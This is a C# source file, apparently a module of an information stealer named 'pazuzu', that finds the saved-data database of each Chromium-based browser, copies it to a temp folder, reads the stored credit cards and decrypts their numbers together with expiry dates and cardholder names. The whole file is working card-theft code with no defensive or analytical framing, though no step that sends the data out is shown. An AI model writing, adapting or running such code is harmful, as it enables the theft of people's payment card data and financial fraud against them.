using System;
using System.Collections.Generic;
using System.IO;

namespace pazuzu.ChromiumBased;

internal class CreditCards
{
	public static List<Common.CreditCard> Get()
	{
		string text = "Web data";
		List<Common.CreditCard> list = new List<Common.CreditCard>();
		string text2 = "";
		string[] chromiumBasedBrowsers = Paths.chromiumBasedBrowsers;
		foreach (string browser in chromiumBasedBrowsers)
		{
			string text3 = Paths.GetUserData(browser) + text;
			if (!File.Exists(text3))
			{
				continue;
			}
			text2 = Environment.GetEnvironmentVariable("temp") + "\\browserCreditCards";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			File.Copy(text3, text2);
			SQLite sQLite = new SQLite(text2);
			sQLite.ReadTable("credit_cards");
			for (int j = 0; j < sQLite.GetRowCount(); j++)
			{
				string value = sQLite.GetValue(j, 4);
				string value2 = sQLite.GetValue(j, 3);
				string value3 = sQLite.GetValue(j, 2);
				string value4 = sQLite.GetValue(j, 1);
				if (string.IsNullOrEmpty(value))
				{
					break;
				}
				Common.CreditCard item = default(Common.CreditCard);
				item.number = Crypt.decryptChrome(value, text3);
				item.expmonth = value3;
				item.expyear = value2;
				item.name = Crypt.GetUTF8(value4);
				list.Add(item);
			}
		}
		return list;
	}
}
